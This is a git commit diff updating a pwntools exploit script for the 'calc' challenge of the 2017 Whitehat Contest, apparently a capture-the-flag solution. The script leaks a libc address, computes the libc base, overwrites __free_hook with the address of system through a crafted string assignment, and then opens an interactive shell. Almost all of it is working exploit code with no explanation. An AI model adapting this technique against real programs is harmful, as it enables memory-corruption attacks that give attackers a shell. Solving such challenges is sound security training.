1815d3d818c83cb6c37419ced78b946207ce8045
DelspoN <delsponn@gmail.com>
2017-11-16 22:20:47 +0900

    [Added] 2017 WhitehatContest calc exploit code

--- 2017_whitehat/calc/ex.py
+++ 2017_whitehat/calc/ex.py
@@ -1,7 +1,7 @@
 from pwn import *
 
-target = "./calc_patched"
-libc = ELF("/lib/i386-linux-gnu/libc-2.24.so")
+target = "./calc"
+libc = ELF("/lib/i386-linux-gnu/libc.so.6")
 p = process(target, env={"LD_PRELOAD":"./libc.so.6"})
 print p.recv()
 
@@ -12,14 +12,16 @@ p.sendline("")
 print p.recv()
 p.sendline("")
 leak = u32(p.recvline()[:-1])
-libc_base = leak - 0x1b77b0 + 0x4000
+libc_base = leak - 0x1b77b0 + 0x5000
 log.info("leak : {}".format(hex(leak)))
 log.info("libc base : {}".format(hex(libc_base)))
 print p.recv()
 
 
-free_hook = libc_base + 0x1b48b0
+free_hook = libc_base + 0x1b38b0
 system = libc_base + libc.symbols['system']
+puts = libc_base + libc.symbols['puts']
+
 
 print "system : " + hex(system)
 print "free hook : " + hex(free_hook)
@@ -29,8 +31,8 @@ p.sendline("a=99")
 print p.recv()
 p.sendline("a=\""+"b"*16+p32(free_hook)+"yyyy\x0c"+"\"")
 print p.recv()
-raw_input()
-p.sendline("a=\"bbbb\"")
-#print p.recv()
-#p.sendline("/bin/sh\x00")
+
+p.sendline("a=\""+p32(system)+"\"")
+print p.recv()
 p.interactive()
+
